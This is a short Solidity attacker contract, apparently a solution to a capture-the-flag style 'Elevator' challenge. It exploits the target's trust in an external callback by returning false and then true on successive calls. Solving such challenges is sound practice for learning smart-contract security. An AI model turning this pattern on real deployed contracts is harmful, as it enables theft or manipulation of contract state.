pragma solidity 0.8.15;

import "../challenge/Elevator.sol";

contract ElevatorAttacker is Building {
    bool set;
    function attack(address target) external {
        Elevator(target).goTo(0);
    }

    function isLastFloor(uint) external returns(bool) {
        bool setTop = set; 
        set = !set;
        return setTop;
    }
}